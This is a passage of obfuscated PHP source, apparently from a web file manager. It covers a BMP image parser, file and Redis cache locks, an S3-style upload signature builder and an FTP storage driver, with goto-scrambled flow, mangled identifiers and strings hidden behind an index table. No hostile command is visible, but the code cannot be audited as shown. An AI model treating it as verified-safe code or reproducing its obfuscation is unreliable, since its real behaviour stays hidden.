$D•Õ—ŞñÊƒ) != 0 || ($E­ö¶¢øŠ¦ & $EŒÀŠà®ë) != 0 || ($E­ö¶¢øŠ¦ & $D•Õ—ŞñÊƒ) != 0 || ($EŒÀŠà®ë & $D•Õ—ŞñÊƒ) != 0) { return !1; } if ($D¶†âƒŠ¶è == 4 || $D¶†âƒŠ¶è == 5) { $Cí‰¡ç–­ã = stream_get_contents($A˜æãåË„‡, $c‰îÈœÔë‘); if ($Cí‰¡ç–­ã === !1) { return !1; } return imagecreatefromstring($Cí‰¡ç–­ã); } $dØğøÔ‚Î = $dê¹·èÙ· * $cåß²ÍïÍ + 31 >> 3 & ~3; goto FÄĞ±ÔŞã; FÄĞ±ÔŞã: $aÚàÚ¢´ = abs($a¤ÉÁ ŸòÒ); $B†ĞãÕ¶ÁÒ = $a¤ÉÁ ŸòÒ > 0 ? $aÚàÚ¢´ - 1 : 0; $Dë²ù•…ŞÇ = $a¤ÉÁ ŸòÒ > 0 ? -1 : 1; goto DÀî»©×Ã“; AÜ¾±ÁË…Ş: if ($Cí‰¡ç–­ã === !1) { return !1; } list(, $DƒŒ‚´„â) = unpack($cİ®èª¼è½[1807], $Cí‰¡ç–­ã); if ($DƒŒ‚´„â == 12) { goto e˜®„¿ÙĞ‡; dòí›‡Ş²“: $DëË—„ïç = $dµˆê¹¶”„ = $cî…±ğ«Íâ = $D¶†âƒŠ¶è = 0; $E­ö¶¢øŠ¦ = 16711680; $EŒÀŠà®ë = 65280; goto aÁŠŞá˜¶; e˜®„¿ÙĞ‡: $Cí‰¡ç–­ã = fread($A˜æãåË„‡, $DƒŒ‚´„â - 4); if ($Cí‰¡ç–­ã === !1) { return !1; } extract(unpack($cİ®èª¼è½[1808] . $cİ®èª¼è½[1809] . $cİ®èª¼è½[1810] . $cİ®èª¼è½[1811], $Cí‰¡ç–­ã)); goto dòí›‡Ş²“; aÁŠŞá˜¶: $D•Õ—ŞñÊƒ = 255; goto C‚Ññå£½; C‚Ññå£½: } else { if (124 < $DƒŒ‚´„â || $DƒŒ‚´„â < 40) { return !1; } else { goto a™ºæ•é‹; eˆò¼Ç”ë: if (($cåß²ÍïÍ == 16 || $cåß²ÍïÍ == 24 || $cåß²ÍïÍ == 32) && $D¶†âƒŠ¶è == 0 && $E­ö¶¢øŠ¦ == 0 && $EŒÀŠà®ë == 0 && $D•Õ—ŞñÊƒ == 0) { switch ($cåß²ÍïÍ) { case 16: $E­ö¶¢øŠ¦ = 31744; $EŒÀŠà®ë = 992; $D•Õ—ŞñÊƒ = 31; break; case 24: case 32: $E­ö¶¢øŠ¦ = 16711680; $EŒÀŠà®ë = 65280; $D•Õ—ŞñÊƒ = 255; break; } } goto DÌ±Ç«òêŠ; a™ºæ•é‹: $Cí‰¡ç–­ã = fread($A˜æãåË„‡, 36); if ($Cí‰¡ç–­ã === !1) { return !1; } extract(unpack($cİ®èª¼è½[1812] . $cİ®èª¼è½[1813] . $cİ®èª¼è½[1810] . $cİ®èª¼è½[1814] . $cİ®èª¼è½[1815] . $cİ®èª¼è½[1816] . $cİ®èª¼è½[1817] . $cİ®èª¼è½[1818] . $cİ®èª¼è½[1819] . $cİ®èª¼è½[1820], $Cí‰¡ç–­ã)); goto EÏÎáğ†Á; f²²áéòƒ: if ($CäÀĞñÑ & 2147483648) { $CäÀĞñÑ = -(~$CäÀĞñÑ & 4294967295) - 1; } if ($Cğ˜÷ã­§[$cİ®èª¼è½[516]] != 0) { $CÓ¿™¿ÕÑ¡ = $cåß²ÍïÍ == 1 || $cåß²ÍïÍ == 4 || $cåß²ÍïÍ == 8 ? ($DëË—„ïç ? $DëË—„ïç : pow(2, $cåß²ÍïÍ)) << 2 : 0; $cŠæÓİˆ  = $c‰îÈœÔë‘ ? $c‰îÈœÔë‘ : ($dê¹·èÙ· * $cåß²ÍïÍ + 31 >> 3 & ~3) * abs($a¤ÉÁ ŸòÒ); $E“Ï»õ”è = $Cğ˜÷ã­§[$cİ®èª¼è½[516]] - $cŠæÓİˆ  - $CÓ¿™¿ÕÑ¡ - 14; if ($DƒŒ‚´„â < $E“Ï»õ”è && 40 <= $DƒŒ‚´„â && $DƒŒ‚´„â <= 124) { $DƒŒ‚´„â = $E“Ï»õ”è; } } if ($DƒŒ‚´„â - 40 > 0) { $Cí‰¡ç–­ã = fread($A˜æãåË„‡, $DƒŒ‚´„â - 40); if ($Cí‰¡ç–­ã === !1) { return !1; } extract(unpack($cİ®èª¼è½[1821] . $cİ®èª¼è½[1822] . $cİ®èª¼è½[1823] . $cİ®èª¼è½[1824], $Cí‰¡ç–­ã . str_repeat($cİ®èª¼è½[1825], 120))); } else { $cî…±ğ«Íâ = $E­ö¶¢øŠ¦ = $EŒÀŠà®ë = $D•Õ—ŞñÊƒ = 0; } goto eˆò¼Ç”ë; EÏÎáğ†Á: if ($dê¹·èÙ· & 2147483648) { $dê¹·èÙ· = -(~$dê¹·èÙ· & 4294967295) - 1; } if ($a¤ÉÁ ŸòÒ & 2147483648) { $a¤ÉÁ ŸòÒ = -(~$a¤ÉÁ ŸòÒ & 4294967295) - 1; } if ($dğÑª…â“ & 2147483648) { $dğÑª…â“ = -(~$dğÑª…â“ & 4294967295) - 1; } goto f²²áéòƒ; DÌ±Ç«òêŠ: } } goto BÕóõÎÏô; DÍŒö¢ƒ•Ó: $cİ®èª¼è½ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($Cğ˜÷ã­§[$cİ®èª¼è½[385]] != 19778) { return !1; } $Cí‰¡ç–­ã = fread($A˜æãåË„‡, 4); goto AÜ¾±ÁË…Ş; f¹ù‰­ÍÔŒ: } } goto AÊá‚­°; D½ÔÂ–™‡Œ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $bÎŒ’æ¶Ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E§Š·ÖÂ‘² = $GLOBALS[$bÎŒ’æ¶Ğ[6]][$bÎŒ’æ¶Ğ[334]]; self::$cachePath = $E§Š·ÖÂ‘²[$bÎŒ’æ¶Ğ[164]][$bÎŒ’æ¶Ğ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($cÌÛ„ßŒ×, $dº«Ğ§ÄÓõ = 0) { goto cİ•ä—‹ÏŒ; cİ•ä—‹ÏŒ: $f‰™Š¼‚÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E…Í®¥´áï = microtime(!0); $F²Î¨ÃšÅ· = $E…Í®¥´áï + $dº«Ğ§ÄÓõ + 0.0001; goto FñÍĞ±ñ†; cã Ò’ø‘Å: $this->unlock($cÌÛ„ßŒ×); return !1; goto AÚàï¦¸µ›; FñÍĞ±ñ†: $dâ¾‹ø·†§ = rtrim(self::$cachePath, $f‰™Š¼‚÷[8]) . $f‰™Š¼‚÷[767] . md5($cÌÛ„ßŒ×) . $f‰™Š¼‚÷[768]; if (file_exists($dâ¾‹ø·†§) && filemtime($dâ¾‹ø·†§) && filemtime($dâ¾‹ø·†§) < time() - 10) { @unlink($dâ¾‹ø·†§); } do { if (file_exists($dâ¾‹ø·†§)) { cacheLockWait(); continue; } $Dº„ß‹éîÌ = fopen($dâ¾‹ø·†§, $f‰™Š¼‚÷[769]); if (!$Dº„ß‹éîÌ) { return !1; } $Fˆ‚Ï†ÕİÃ = flock($Dº„ß‹éîÌ, LOCK_EX | LOCK_NB); self::$caches[$cÌÛ„ßŒ×] = array($f‰™Š¼‚÷[770] => $Dº„ß‹éîÌ, $f‰™Š¼‚÷[164] => $dâ¾‹ø·†§); fwrite($Dº„ß‹éîÌ, $F²Î¨ÃšÅ·); clearstatcache(); if ($Dº„ß‹éîÌ && $Fˆ‚Ï†ÕİÃ) { return !0; } cacheLockWait(); } while (microtime(!0) < $F²Î¨ÃšÅ·); goto cã Ò’ø‘Å; AÚàï¦¸µ›: } public function lockGet($bêï–­¦Ì) { $aÕèÒ«÷æ„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D•ØèŞ‘Ö‚ = rtrim(self::$cachePath, $aÕèÒ«÷æ„[8]) . $aÕèÒ«÷æ„[767] . md5($bêï–­¦Ì) . $aÕèÒ«÷æ„[768]; return file_exists($D•ØèŞ‘Ö‚); } public function unlock($f×Œô†¦“Ô) { goto bİÖ Ç¢½¹; bİÖ Ç¢½¹: $D”ñÏø•ËŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÔ¯Ğ›„ã = self::$caches[$f×Œô†¦“Ô]; if (!$EÔ¯Ğ›„ã) { return; } goto D…ù¡Šê¦Æ; AŒ¾È­—ùå: unset(self::$caches[$f×Œô†¦“Ô]); goto b¯ĞøŞ©Œ; D…ù¡Šê¦Æ: @flock($EÔ¯Ğ›„ã[$D”ñÏø•ËŠ[770]], LOCK_UN); @fclose($EÔ¯Ğ›„ã[$D”ñÏø•ËŠ[770]]); @unlink($EÔ¯Ğ›„ã[$D”ñÏø•ËŠ[164]]); goto AŒ¾È­—ùå; b¯ĞøŞ©Œ: } } class CacheLockRedis { public function lock($aÎ¡Œ°Ïµ, $bøôá†Ñ´Î = 10) { $Aè„Ğ®ÃİĞ = Cache::init(); $aÅÙî±“ë° = microtime(!0) + $bøôá†Ñ´Î; while (microtime(!0) < $aÅÙî±“ë°) { $c—µÃ ‹ = $Aè„Ğ®ÃİĞ->get($aÎ¡Œ°Ïµ); if (!$c—µÃ ‹) { $dšß‹¨íä“ = $Aè„Ğ®ÃİĞ->setLock($aÎ¡Œ°Ïµ, $aÅÙî±“ë°, $bøôá†Ñ´Î); if ($dšß‹¨íä“) { return !0; } } else { if ($c—µÃ ‹ < microtime(!0)) { $Aè„Ğ®ÃİĞ->set($aÎ¡Œ°Ïµ, $aÅÙî±“ë°, $aÅÙî±“ë°); if ($Aè„Ğ®ÃİĞ->get($aÎ¡Œ°Ïµ) === $c—µÃ ‹) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Aóİ‰‚òºö) { return Cache::init()->get($Aóİ‰‚òºö); } public function unlock($d‘µ«øÄ…ø) { return Cache::init()->remove($d‘µ«øÄ…ø); } } goto AÂèò‹ÒÇæ; d¡Ê¤ÓìĞ’: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($EÆŞôçõõ¢) { parent::__construct($EÆŞôçõõ¢); $this->signatureVersion($_SERVER[ÚŠ•´ÍéÒÑÔ][197]); } public function uploadFormData($b×ÃáØµ„ó, $bÙÓ¬¢‡¿É = 3600) { goto bª¾¸ÁĞè‚; cÎáµÔš±: $DÃº±ŠŠŒ¯ = $f—‚›„Ø ë[59]; $AÙÜ•Šğè = gmdate($f—‚›„Ø ë[1119]); $Aƒòª¿ª = gmdate($f—‚›„Ø ë[685]); goto eÑçÆ”Çª; eÎè–˜‘äã: $Bœø¬°²’… = hash_hmac($f—‚›„Ø ë[1128], $DÃº±ŠŠŒ¯, $fªğ¿’Áë®, !0); $d½Ë»ø‹˜¨ = hash_hmac($f—‚›„Ø ë[1128], $Eõ‹çæºæÏ, $Bœø¬°²’…, !0); $Bñà·”‚À¢ = hash_hmac($f—‚›„Ø ë[1128], $dŸåã, $d½Ë»ø‹˜¨); goto A‚ÉˆËøİÃ; bª¾¸ÁĞè‚: $f—‚›„Ø ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b¸¼Û³„ã = $f—‚›„Ø ë[182]; $DĞ¨¤ˆ…µ = $f—‚›„Ø ë[1118]; goto cÎáµÔš±; Bä³¡Ïç‰Î: $dŸåã = base64_encode(json_encode($FËí¢¶ËÕï)); $f«‹ã ÔŒ = hash_hmac($f—‚›„Ø ë[1128], $Aƒòª¿ª, $f—‚›„Ø ë[1129] . $this->secret, !0); $fªğ¿’Áë® = hash_hmac($f—‚›„Ø ë[1128], $this->region, $f«‹ã ÔŒ, !0); goto eÎè–˜‘äã; eÑçÆ”Çª: $Eõ‹çæºæÏ = $f—‚›„Ø ë[1120]; $bˆ‡ Áö¯ = $bÙÓ¬¢‡¿É . $f—‚›„Ø ë[33]; $Bá™©ƒ‹šÇ = $f—‚›„Ø ë[1085]; goto E¯‹éš¾Æ; E¯‹éš¾Æ: $bãäêàÄ‹ = array($this->accessKey, $Aƒòª¿ª, $this->region, $DÃº±ŠŠŒ¯, $Eõ‹çæºæÏ); $EóÊî—±à = implode($f—‚›„Ø ë[8], $bãäêàÄ‹); $FËí¢¶ËÕï = array($f—‚›„Ø ë[1087] => gmdate($f—‚›„Ø ë[1086], strtotime($f—‚›„Ø ë[1121])), $f—‚›„Ø ë[1088] => array(array($f—‚›„Ø ë[1090] => $this->bucket), array($f—‚›„Ø ë[1089] => $b¸¼Û³„ã), array($f—‚›„Ø ë[1091], $f—‚›„Ø ë[1092], $f—‚›„Ø ë[33]), array($f—‚›„Ø ë[1091], $f—‚›„Ø ë[1122], $f—‚›„Ø ë[33]), array($f—‚›„Ø ë[1091], $f—‚›„Ø ë[1123], $f—‚›„Ø ë[33]), array($f—‚›„Ø ë[1093] => $Bá™©ƒ‹šÇ), array($f—‚›„Ø ë[1124] => $EóÊî—±à), array($f—‚›„Ø ë[1125] => $DĞ¨¤ˆ…µ), array($f—‚›„Ø ë[1126] => $AÙÜ•Šğè), array($f—‚›„Ø ë[1127] => $bˆ‡ Áö¯))); goto Bä³¡Ïç‰Î; A‚ÉˆËøİÃ: $cÎ¬“İª£ì = array($f—‚›„Ø ë[196] => $f—‚›„Ø ë[33], $f—‚›„Ø ë[1130] => $f—‚›„Ø ë[33], $f—‚›„Ø ë[1089] => $b¸¼Û³„ã, $f—‚›„Ø ë[1093] => $Bá™©ƒ‹šÇ, $f—‚›„Ø ë[1097] => $dŸåã, $f—‚›„Ø ë[1131] => $EóÊî—±à, $f—‚›„Ø ë[1132] => $DĞ¨¤ˆ…µ, $f—‚›„Ø ë[1133] => $AÙÜ•Šğè, $f—‚›„Ø ë[1134] => $bˆ‡ Áö¯, $f—‚›„Ø ë[1135] => $Bñà·”‚À¢, $f—‚›„Ø ë[166] => $this->getHost()); return $cÎ¬“İª£ì; goto b×ãß’Û; b×ãß’Û: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($Aó°Ø´¾­´) { parent::__construct(); if (count($Aó°Ø´¾­´) > 0) { $this->_init($Aó°Ø´¾­´); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Aõ™Í¦‰çÅ) { $fî¡³ƒ‘­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $config; $this->appCharset = $config[$fî¡³ƒ‘­[1136]]; $this->systemCharset = $config[$fî¡³ƒ‘­[1137]]; if (isset($Aõ™Í¦‰çÅ[$fî¡³ƒ‘­[1138]]) && $Aõ™Í¦‰çÅ[$fî¡³ƒ‘­[1138]]) { $this->systemCharset = $Aõ™Í¦‰çÅ[$fî¡³ƒ‘­[1138]]; } } public function iconvApp($c×®—Ôîáá) { return $this->iconvTo($c×®—Ôîáá, $this->systemCharset, $this->appCharset); } public function iconvSystem($fÏ¡¼ƒ‰¨) { return $this->iconvTo($fÏ¡¼ƒ‰¨, $this->appCharset, $this->systemCharset); } public function getPathOuter($cæ‘‰ñº¾Ø) { goto EËÒ¬Ğ¯‰Ñ; d®æ’óõŠÄ: if (substr($eÑËÀíÔÙ¿, 0, 2) == $Bõšøºî»ö[1139]) { $eÑËÀíÔÙ¿ = BASIC_PATH . substr($eÑËÀíÔÙ¿, 2); } if (substr($cæ‘‰ñº¾Ø, 0, 2) == $Bõšøºî»ö[1139]) { $cæ‘‰ñº¾Ø = BASIC_PATH . substr($cæ‘‰ñº¾Ø, 2); } $eÑËÀíÔÙ¿ = KodIO::clear($eÑËÀíÔÙ¿); goto Dƒâ°–Š¿; d†Íí´Ã: return $this->pathDriver . $Bõšøºî»ö[8] . ltrim($cæ‘‰ñº¾Ø, $Bõšøºî»ö[8]); goto CçŠ¹›Ã¥–; EËÒ¬Ğ¯‰Ñ: $Bõšøºî»ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÑËÀíÔÙ¿ = $this->iconvApp($this->pathBase); $cæ‘‰ñº¾Ø = $this->iconvApp($cæ‘‰ñº¾Ø); goto d®æ’óõŠÄ; Dƒâ°–Š¿: $cæ‘‰ñº¾Ø = KodIO::clear($cæ‘‰ñº¾Ø); $cæ‘‰ñº¾Ø = substr($cæ‘‰ñº¾Ø, strlen($eÑËÀíÔÙ¿)); if (empty($this->pathDriver)) { return $cæ‘‰ñº¾Ø; } goto d†Íí´Ã; CçŠ¹›Ã¥–: } private function _init($EÛ¨»ÊÕôØ = array()) { goto Dß·øÓè„; c‡Øä”¾‘š: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $a›š¸ê©Ÿ[$F¯ÆæêÃç] = array($Aï–½°ÆÎé[1145] => $this->connect, $Aï–½°ÆÎé[166] => $this->host, $Aï–½°ÆÎé[165] => $this->scheme, $Aï–½°ÆÎé[167] => $this->port); goto EĞƒ“·­™Ã; EĞƒ“·­™Ã: return $cå÷ªØÕÖ; goto e“µ®ÙÏÜ—; aÁ·ªĞô‰: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $cå÷ªØÕÖ = @ftp_login($this->connect, $this->username, $this->userpass); goto c‡Øä”¾‘š; Dß·øÓè„: $Aï–½°ÆÎé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!function_exists($Aï–½°ÆÎé[1140])) { show_json(LNG($Aï–½°ÆÎé[1141]), !1); } $this->charsetReset($EÛ¨»ÊÕôØ); goto fß¦÷Ì†À½; fß¦÷Ì†À½: foreach ($EÛ¨»ÊÕôØ as $CàÁŞçÈ¨ => $A»íëÑ–­•) { if (isset($this->{$CàÁŞçÈ¨})) { $this->{$CàÁŞçÈ¨} = $A»íëÑ–­•; } } static $a›š¸ê©Ÿ = array(); $F¯ÆæêÃç = md5(json_encode($EÛ¨»ÊÕôØ)); goto CöÙÈ¯‹±; CöÙÈ¯‹±: if (isset($a›š¸ê©Ÿ[$F¯ÆæêÃç])) { foreach ($a›š¸ê©Ÿ[$F¯ÆæêÃç] as $CàÁŞçÈ¨ => $A»íëÑ–­•) { $this->{$CàÁŞçÈ¨} = $A»íëÑ–­•; } return !0; } $c¼Ö·‚ƒî¾ = parse_url(trim($this->server, $Aï–½°ÆÎé[8])); $this->host = $c¼Ö·‚ƒî¾[$Aï–½°ÆÎé[166]]; goto AÔø…®´ä¢; AÔø…®´ä¢: $d›÷Ğö…Şâ = isset($c¼Ö·‚ƒî¾[$Aï–½°ÆÎé[165]]) && $c¼Ö·‚ƒî¾[$Aï–½°ÆÎé[165]] == $Aï–½°ÆÎé[1142] ? !0 : !1; $this->scheme = $d›÷Ğö…Şâ ? $Aï–½°ÆÎé[1143] : $Aï–½°ÆÎé[1144]; $this->port = isset($c¼Ö·‚ƒî¾[$Aï–½°ÆÎé[167]]) ? $c¼Ö·‚ƒî¾[$Aï–½°ÆÎé[167]] : 21; goto aÁ·ªĞô‰; e“µ®ÙÏÜ—: } private function _isconn() { return is_resource($this->connect); } public function mkfile($båùœòÔğÏ, $aÓˆçù£ = '', $e²Ÿ¢†µÜ™ = REPEAT_RENAME) { if ($this->setContent($båùœòÔğÏ, $aÓˆçù£)) { return $this->getPathOuter($båùœòÔğÏ); } return !1; } public function mkdir($EÜ°™ÅŞÙ, $eˆ……©ßÁñ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $EÜ°™ÅŞÙ = $this->iconvSystem($EÜ°™ÅŞÙ); if ($this->isFolder($EÜ°™ÅŞÙ) || @ftp_mkdir($this->connect, $EÜ°™ÅŞÙ)) { return $this->getPathOuter($EÜ°™ÅŞÙ); } if (!$this->mkdir($this->pathFather($EÜ°™ÅŞÙ))) { return !1; } if ($EÜ°™ÅŞÙ = @ftp_mkdir($this->connect, $EÜ°™ÅŞÙ)) { return $this->getPathOuter($EÜ°™ÅŞÙ); } return !1; } public function copyFile($d—¼òÒµê„, $F¶³–„ó¿½) { goto FÅÅĞæÑºŸ; E¯ÄŞ…íÄ: $E… ˆâ‰‘Ê = $this->iconvApp($FŒÙÄõ¼‡ß); $this->download($d—¼òÒµê„, $E… ˆâ‰‘Ê); $CÙ»¤Î‘È¹ = $this->upload($F¶³–„ó¿½, $E… ˆâ‰‘Ê); goto FŞµ›¡ë«§; FŞµ›¡ë«§: $this->tempFileRemve($FŒÙÄõ¼‡ß); return $CÙ»¤Î‘È¹; goto aâŠÃ¾í³ó; FÅÅĞæÑºŸ: if (!$this->_isconn()) { return !1; } $b»æ£ò¾» = $this->pathThis($this->iconvSystem($d—¼òÒµê„)); $FŒÙÄõ¼‡ß = $this->tempFile($b»æ£ò¾»); goto E¯ÄŞ…íÄ; aâŠÃ¾í³ó: } public function moveFile($d‚ÖŸŠ‹»Ì, $Aœ™ƒô’Ò) { if (!$this->_isconn()) { return !1; } $d‚ÖŸŠ‹»Ì = $this->iconvSystem($d‚ÖŸŠ‹»Ì); $Aœ™ƒô’Ò = $this->iconvSystem($Aœ™ƒô’Ò); $CÂ¿Ú‰µä = @ftp_rename($this->connect, $d‚ÖŸŠ‹»Ì, $Aœ™ƒô’Ò); return $CÂ¿Ú‰µä ? $this->getPathOuter($Aœ™ƒô’Ò) : !1; } public function delFile($D²‚®¥í) { if (!$this->_isconn()) { return !1; } $D²‚®¥í = $this->iconvSystem($D²‚®¥í); return @ftp_delete($this->connect, $D²‚®¥í); } public function delFolder($CåÙ³êÔ°) { if (!$this->_isconn()) { return !1; } $CåÙ³êÔ° = $this->iconvSystem($CåÙ³êÔ°); $BÁŠê¯ñ´ = $this->ftpList($CåÙ³êÔ°); if (!$BÁŠê¯ñ´) { return @ftp_rmdir($this->connect, $CåÙ³êÔ°); } foreach ($BÁŠê¯ñ´ as $a’ÈÊñ¼¾í) { if ($this->isFolder($a’ÈÊñ¼¾í)) { $a’ÈÊñ¼¾í = $this->iconvApp($a’ÈÊñ¼¾í); $this->delFolder($a’ÈÊñ¼¾í); } else { @ftp_delete($this->connect, $a’ÈÊñ¼¾í); } } return @ftp_rmdir($this->connect, $CåÙ³êÔ°); } public function rename($b•†ÚÔ“„±, $BÔ›™ø™º) { goto DœŸ²ïÅˆù; fö°ßˆÂ…ï: return $d„Ñì”è¢ß ? $this->getPathOuter($f®‡±ÂÇŸ) : !1; goto eàøÀ´ëŒ¶; DœŸ²ïÅˆù: $cÛÊšùšÕ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->_isconn()) { return !1; } $C”ª¾é¡¢‡ = $this->fileNameAuto($this->pathFather($b•†ÚÔ“„±), $BÔ›™ø™º); goto aÔ¦„îÂÌ; aÔ¦„îÂÌ: $C”ª¾é¡¢‡ = $this->iconvSystem($C”ª¾é¡¢‡); $b•†ÚÔ“„± = $this->iconvSystem($b•†ÚÔ“„±); $dÑ²‡í©ñ‚ = $this->pathFather($b•†ÚÔ“„±); goto döÇ‚ô‡¿Ø; döÇ‚ô‡¿Ø: $f®‡±ÂÇŸ = rtrim($dÑ²‡í©ñ‚, $cÛÊšùšÕ[8]) . $cÛÊšùšÕ[8] . $C”ª¾é¡¢‡; $d„Ñì”è¢ß = @ftp_rename($this->connect, $b•†ÚÔ“„±, $f®‡±ÂÇŸ); $f®‡±ÂÇŸ = $this->iconvApp($f®‡±ÂÇŸ); goto fö°ßˆÂ…ï; eàøÀ´ëŒ¶: } private function folderInfo($f÷à¾ƒõ¢Í, $cÊäå§Ç® = false) { goto AÕ­Ûèõ¹Ñ; F¤Ëîİã«: $B´öëÒ‘Òô = $this->iconvSystem($f÷à¾ƒõ¢Í); if ($cÊäå§Ç®) { return array($CÄê…¬çÆ[28] => $CòãçĞÊ™í, $CÄê…¬çÆ[75] => $AÉºÀåœ, $CÄê…¬çÆ[29] => $CÄê…¬çÆ[76]); } $Ağ­‹ñ³¶º = array($CÄê…¬çÆ[28] => $CòãçĞÊ™í, $CÄê…¬çÆ[75] => $AÉºÀåœ, $CÄê…¬çÆ[29] => $CÄê…¬çÆ[76], $CÄê…¬çÆ[184] => 0, $CÄê…¬çÆ[107] => 0, $CÄê…¬çÆ[1146] => !0, $CÄê…¬çÆ[1147] => !0); goto Aö»á‘îô; AÕ­Ûèõ¹Ñ: $CÄê…¬çÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÉºÀåœ = $this->getPathOuter(rtrim($f÷à¾ƒõ¢Í, $CÄê…¬çÆ[8])); $CòãçĞÊ™í = $this->pathThis($AÉºÀåœ); goto F¤Ëîİã«; Aö»á‘îô: return $Ağ­‹ñ³¶º; goto CÔË”ò©; CÔË”ò©: } private function fileInfo($e«äŠ“œÆ¦, $câ²Şè‚” = false) { goto aÓó²‹Ş’É; aÓó²‹Ş’É: $dËîéÙ´’Ò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‡Š£å«µ = $this->getPathOuter(rtrim($e«äŠ“œÆ¦, $dËîéÙ´’Ò[8])); $D¦Á˜¯¿• = $this->pathThis($F‡Š£å«µ); goto EŞ ŞµÌ„ƒ; eÎ°’Í‚‹¹: $e„™Òâ‰ŞÉ[$dËîéÙ´’Ò[107]] = $e„™Òâ‰ŞÉ[$dËîéÙ´’Ò[107]] > 0 ? $e„™Òâ‰ŞÉ[$dËîéÙ´’Ò[107]] : 0; return $e„™Òâ‰ŞÉ; goto B’½³ÆìÓ; EŞ ŞµÌ„ƒ: $D­‘Àó»¸ = $this->iconvSystem($e«äŠ“œÆ¦); if ($câ²Şè‚”) { return array($dËîéÙ´’Ò[28] => $D¦Á˜¯¿•, $dËîéÙ´’Ò[75] => $F‡Š£å«µ, $dËîéÙ´’Ò[29] => $dËîéÙ´’Ò[164], $dËîéÙ´’Ò[157] => $this->ext($e«äŠ“œÆ¦), $dËîéÙ´’Ò[77] => $this->size($e«äŠ“œÆ¦)); } $e„™Òâ‰ŞÉ = array($dËîéÙ´’Ò[28] => $D¦Á˜¯¿•, $dËîéÙ´’Ò[75] => $F‡Š£å«µ, $dËîéÙ´’Ò[29] => $dËîéÙ´’Ò[164], $dËîéÙ´’Ò[184] => 0, $dËîéÙ´’Ò[107] => @ftp_mdtm($this->connect, $D­‘Àó»¸), $dËîéÙ´’Ò[157] => $this->ext($e«äŠ“œÆ¦), $dËîéÙ´’Ò[77] => $this->size($e«äŠ“œÆ¦), $dËîéÙ´’Ò[1146] => !0, $dËîéÙ´’Ò[1147] => !0); goto eÎ°’Í‚‹¹; B’½³ÆìÓ: } public function size($Fƒ—ñÓç‚ƒ) { $F–ø‰¨ˆŒê = $this->objectMeta($Fƒ—ñÓç‚ƒ); return $F–ø‰¨ˆŒê ? $F–ø‰¨ˆŒê[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]] : 0; } public function info($F…È»å‹¢Î) { if ($this->isFile($F…È»å‹¢Î)) { return $this->fileInfo($F…È»å‹¢Î, 0); } else { if ($this->isFolder($F…È»å‹¢Î)) { return $this->folderInfo($F…È»å‹¢Î); } } return !1; } public function exist($CÍÌì·ñ‘ë) { return $this->objectMeta($CÍÌì·ñ‘ë) ? !0 : !1; } public function isFile($C–Á¤«´¼Ñ) { $Dœ¡«‡É†á =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FôİÉğª†‚ = $this->objectMeta($C–Á¤«´¼Ñ); return $FôİÉğª†‚ ? $FôİÉğª†‚[$Dœ¡«‡É†á[29]] == $Dœ¡«‡É†á[164] : !1; } public function isFolder($AŸÑ°Òˆ™”) { $B¼ñõ •÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fƒƒ­Æ°—Ä = $this->objectMeta($AŸÑ°Òˆ™”); return $Fƒƒ­Æ°—Ä ? $Fƒƒ­Æ°—Ä[$B¼ñõ •÷[29]] == $B¼ñõ •÷[76] : !1; } public function listPath($dÕè£íö‰ù, $D°½¯Â–¼° = false) { goto BÌ¬‚‘¦£; BÌ¬‚‘¦£: $B„‘Üõïà =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->_isconn()) { return !1; } $dÕè£íö‰ù = $this->iconvSystem($dÕè£íö‰ù); goto D†×Ôñª¤; e´ „¿­š‹: foreach ($DËÛˆõ±ñ° as $dÕè£íö‰ù) { if ($this->isFolder($dÕè£íö‰ù)) { $c¡âé÷œƒÔ[$B„‘Üõïà[74]][] = $this->folderInfo($dÕè£íö‰ù, $D°½¯Â–¼°); } else { $c¡âé÷œƒÔ[$B„‘Üõïà[73]][] = $this->fileInfo($dÕè£íö‰ù, $D°½¯Â–¼°); } } return $c¡âé÷œƒÔ; goto Fˆõà­§À÷; D†×Ôñª¤: $DËÛˆõ±ñ° = $this->ftpList($dÕè£íö‰ù); $c¡âé÷œƒÔ = array($B„‘Üõïà[74] => array(), $B„‘Üõïà[73] => array()); if (!$DËÛˆõ±ñ°) { return $c¡âé÷œƒÔ; } goto e´ „¿­š‹; Fˆõà­§À÷: } public function has($aôäƒ±£ğå, $eõŠÒ¤ïÓ = false, $aĞ›¼î±å = true) { goto CøÆ“àˆÉ; aÏ¦¤‰¬ÊÑ: foreach ($F³à‹ä¬ as $aôäƒ±£ğå) { if ($aĞ›¼î±å) { if (!$this->isFolder($aôäƒ±£ğå)) { return !0; } } else { if ($this->isFolder($aôäƒ±£ğå)) { return !0; } } } return !1; goto bö¦İÎ£æ; CøÆ“àˆÉ: $CğİŒµ‚â† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->_isconn()) { return !1; } $aôäƒ±£ğå = $this->iconvSystem($aôäƒ±£ğå); goto cæ¥³ÎÃìâ; 